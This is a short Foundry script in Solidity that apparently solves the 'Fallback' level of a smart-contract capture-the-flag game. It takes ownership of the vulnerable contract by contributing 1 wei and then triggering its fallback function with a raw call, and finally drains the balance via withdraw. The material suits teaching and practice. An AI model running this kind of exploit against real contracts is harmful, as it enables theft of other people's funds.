pragma solidity ^0.8.0;

import "../src/level1.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Solution is Script {
    Fallback public ins = Fallback(payable(0xE7B2700d905b9a059Bb0Bc98832143AEF0B9b0Fd));

    // SPDX-License-Identifier: MIT

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // previous owner
        console.log(ins.owner());

        ins.contribute{value: 1 wei}();
        address(ins).call{value: 1 wei}("");
        
        // change owner to me
        console.log(ins.owner());
        console.log(vm.envAddress("MY_ADDRESS"));
        // drain balance
        ins.withdraw();
        vm.stopBroadcast();
    }
}